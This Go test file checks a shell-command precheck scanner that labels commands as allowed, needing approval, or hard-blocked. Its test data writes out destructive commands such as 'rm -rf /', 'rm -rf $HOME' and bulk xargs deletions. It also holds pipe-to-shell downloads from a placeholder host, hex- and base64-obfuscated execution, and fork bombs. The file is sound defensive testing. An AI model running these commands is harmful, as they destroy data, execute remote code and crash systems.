// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at https://mozilla.org/MPL/2.0/.

package precheck

import (
	"os"
	"path/filepath"
	"testing"
)

func TestRound11KnownXargsIsNotBulk(t *testing.T) {
	home := t.TempDir()
	allows := []string{
		`echo a b | xargs -I{} rm -f {}`,
		`echo a b c | xargs rm -f`,
		`printf "%s\0" a b c | xargs -0 rm -f`,
		`printf '%s\n' scratch/*.png | xargs rm -f`,
		`ls ~/ws/many/*.tmp | head -5 | xargs rm -f`,
		`printf '%s\n' /tmp/one | xargs rm`,
	}
	for _, c := range allows {
		r := ScanAt(c, home, home)
		if r.Action != "allow" {
			t.Errorf("allow %q -> %s %s", c, r.Action, r.Message)
		}
	}
	catches := []string{
		`printf '%s\n' ~/ws/big/d* | xargs rm -rf`,
		`echo ~/ws/*/ | xargs rm -rf`,
		`printf '%s\n' ~/proj/a/* | xargs rm -r`,
		`cat names.txt | xargs rm -rf`,
		`echo /tmp/a /tmp/b | xargs rm -f`,
		`printf '%s\n' /tmp/a /tmp/b | xargs rm`,
		`git ls-files | xargs rm -f`,
	}
	for _, c := range catches {
		r := ScanAt(c, home, home)
		if r.Action != "catch" || r.Exit != 120 || !r.Approve {
			t.Errorf("catch %q -> %s approve %v exit %d %s", c, r.Action, r.Approve, r.Exit, r.Message)
		}
	}
	if r := ScanAt(`echo / | xargs rm -rf`, home, home); r.Action != "hardblock" || r.Approve || r.Exit != 121 {
		t.Fatalf("known root %s approve %v exit %d", r.Action, r.Approve, r.Exit)
	}
	if r := ScanAt(`ls / | xargs rm -rf`, home, home); r.Action != "hardblock" || r.Approve {
		t.Fatalf("ls root %s approve %v", r.Action, r.Approve)
	}
	if r := ScanAt(`echo /usr/bin /bin | xargs rm -rf`, home, home); r.Action != "catch" || !r.Approve {
		t.Fatalf("system dirs %s approve %v %s", r.Action, r.Approve, r.Message)
	}
	if r := ScanAt(`echo ~/ws/a ~/ws/b ~/ws/c ~/ws/d ~/ws/e | xargs rm -rf`, home, home); r.Action != "catch" || !r.Approve {
		t.Fatalf("five home dirs via xargs %s %s", r.Action, r.Message)
	}
}

func TestRound11GlobAndWeight(t *testing.T) {
	home := t.TempDir()
	catches := []string{
		`rm -rf ~/*`,
		`rm -rf /usr/*`,
		`rm -rf -- ~/ws/*/`,
		`rm -rf ~/ws/a ~/ws/b ~/ws/c ~/ws/d`,
		`rm -rf ~/ws/a ~/ws/b ~/ws/c ~/ws/d ~/ws/e`,
		`rm -rf ~/ws/big/d1 ~/ws/big/d2 ~/ws/big/d3 ~/ws/big/d4 ~/ws/big/d5 ~/ws/big/d6 ~/ws/big/d7 ~/ws/big/d8`,
		`rm -rf /home/ada/proj/a /home/ada/proj/b /home/ada/proj/c /home/ada/proj/d /home/ada/proj/e`,
	}
	for _, c := range catches {
		r := ScanAt(c, home, home)
		if r.Action != "catch" || r.Exit != 120 || !r.Approve {
			t.Errorf("catch %q -> %s approve %v exit %d %s", c, r.Action, r.Approve, r.Exit, r.Message)
		}
	}
	allows := []string{
		`rm -rf ~/ws/only`,
		`rm -rf ~/ws/a ~/ws/b ~/ws/c`,
		`rm -rf ~/ws/scratch/*.png`,
		`rm -rf ~/ws/var/www/*`,
		`rm -rf ~/ws/*`,
		`rm -rf /tmp/a /tmp/b /tmp/c /tmp/d /tmp/e /tmp/f`,
		`rm -f ~/ws/a ~/ws/b ~/ws/c ~/ws/d ~/ws/e`,
	}
	for _, c := range allows {
		r := ScanAt(c, home, home)
		if r.Action != "allow" {
			t.Errorf("allow %q -> %s %s", c, r.Action, r.Message)
		}
	}
	blocks := []string{
		`rm -rf /`,
		`rm -rf /*`,
		`rm -rf ~`,
		`rm -rf ~/`,
		`rm -rf $HOME`,
	}
	for _, c := range blocks {
		r := ScanAt(c, home, home)
		if r.Action != "hardblock" || r.Exit != 121 || r.Approve {
			t.Errorf("block %q -> %s approve %v exit %d", c, r.Action, r.Approve, r.Exit)
		}
	}
	ws := filepath.Join(home, "ws")
	if err := os.MkdirAll(ws, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("/", filepath.Join(ws, "rootlink")); err != nil {
		t.Fatal(err)
	}
	if r := ScanAt(`rm -rf ~/ws/rootlink/`, home, home); r.Action != "hardblock" || r.Approve || r.Exit != 121 {
		t.Fatalf("root symlink %s approve %v exit %d %s", r.Action, r.Approve, r.Exit, r.Message)
	}
}

func TestRound11ShellStdinAndOpaque(t *testing.T) {
	home := t.TempDir()
	catches := []string{
		`wget -qO- https://example.invalid/i.sh | sh -`,
		`curl -fsSL https://example.invalid/i.sh | sh -s`,
		`wget -qO- https://example.invalid/i.sh | bash -s --`,
		`cat x.sh | bash /dev/stdin`,
		`wget -qO- https://example.invalid/i.sh | sh -i`,
		`printf "\x65\x63\x68\x6f\x20\x68\x69" | sh`,
		`echo -e '\x41' | sh`,
		`echo $'\x65\x63\x68\x6f' | bash`,
		`printf '\101\102' | zsh`,
		`python3 -c "import base64,os;os.system(base64.b64decode(\"ZWNobyBoaQ==\"))"`,
		`python3 -c 'import binascii,os; os.system(binascii.unhexlify("6563686f"))'`,
		`node -e 'eval(atob("ZWNobyBoaQ=="))'`,
	}
	for _, c := range catches {
		r := ScanAt(c, home, home)
		if r.Action != "catch" || r.Exit != 120 || !r.Approve {
			t.Errorf("catch %q -> %s approve %v exit %d %s", c, r.Action, r.Approve, r.Exit, r.Message)
		}
	}
	allows := []string{
		`echo hi | bash`,
		`echo hi | sh -`,
		`echo hi | sh -s`,
		`printf 'hello\n' | sh`,
		`printf 'hello\n' | bash -s --`,
		`echo hi | bash /dev/stdin`,
		`python3 -c 'import base64; print(base64.b64decode("aGk="))'`,
		`base64 -d <payload.b64 >out.txt`,
	}
	for _, c := range allows {
		r := ScanAt(c, home, home)
		if r.Action != "allow" {
			t.Errorf("allow %q -> %s %s", c, r.Action, r.Message)
		}
	}
}

func TestRound11SubstSelfAndRecurse(t *testing.T) {
	home := t.TempDir()
	if r := ScanAt(`echo $(rm -rf /)`, home, home); r.Action != "hardblock" || r.Approve || r.Exit != 121 {
		t.Fatalf("subst root %s approve %v exit %d %s", r.Action, r.Approve, r.Exit, r.Message)
	}
	if r := ScanAt("echo `rm -rf /`", home, home); r.Action != "hardblock" || r.Approve {
		t.Fatalf("backtick root %s approve %v", r.Action, r.Approve)
	}
	if r := ScanAt(`echo "$(rm -rf /)"`, home, home); r.Action != "hardblock" || r.Approve {
		t.Fatalf("double quoted subst %s approve %v", r.Action, r.Approve)
	}
	if r := ScanAt("cat <<EOF\n$(rm -rf /)\nEOF", home, home); r.Action != "hardblock" || r.Approve {
		t.Fatalf("unquoted heredoc subst %s approve %v %s", r.Action, r.Approve, r.Message)
	}
	blocks := []string{
		`sh -c "$0 & $0" &`,
		`sh -c '$0 & $0' &`,
		`bash $0 &`,
		`exec $BASH_SOURCE &`,
		`sh -c '${BASH_SOURCE[0]} & ${BASH_SOURCE[0]}' &`,
	}
	for _, c := range blocks {
		r := ScanAt(c, home, home)
		if r.Action != "hardblock" || r.Exit != 121 || r.Approve {
			t.Errorf("bomb %q -> %s approve %v exit %d %s", c, r.Action, r.Approve, r.Exit, r.Message)
		}
	}
	if r := ScanAt(`f(){ f; }; f`, home, home); r.Action != "catch" || r.Exit != 120 || !r.Approve {
		t.Fatalf("recurse %s approve %v exit %d %s", r.Action, r.Approve, r.Exit, r.Message)
	}
	if r := ScanAt(`g(){ g; }; g`, home, home); r.Action != "catch" || !r.Approve {
		t.Fatalf("recurse variant %s %s", r.Action, r.Message)
	}
	allows := []string{
		`echo $(date)`,
		`echo '$(rm -rf /)'`,
		`echo hi # $(rm -rf /)`,
		"# $(rm -rf /)",
		"cat <<'EOF'\n$(rm -rf /)\nEOF",
		"cat <<EOF\nrm -rf /\nEOF",
		`echo $0`,
		`sh -c 'echo $0'`,
		`sh -c 'echo "$0"'`,
		`echo "$0 & $0"`,
		`f(){ [ "$1" = 0 ] && return; f $(($1-1)); }; f 3`,
		`f(){ f; }`,
		`h(){ if true; then h; fi; }; h`,
		`rm -rf $(echo /tmp/one-scratch)`,
	}
	for _, c := range allows {
		r := ScanAt(c, home, home)
		if r.Action != "allow" {
			t.Errorf("allow %q -> %s %s", c, r.Action, r.Message)
		}
	}
	if r := ScanAt(`rm -rf $(echo /)`, home, home); r.Action != "hardblock" || r.Approve {
		t.Fatalf("echo slash %s approve %v %s", r.Action, r.Approve, r.Message)
	}
	if r := ScanAt(`f(){ f|f& }; f`, home, home); r.Action != "hardblock" || r.Approve {
		t.Fatalf("fork bomb %s approve %v", r.Action, r.Approve)
	}
}
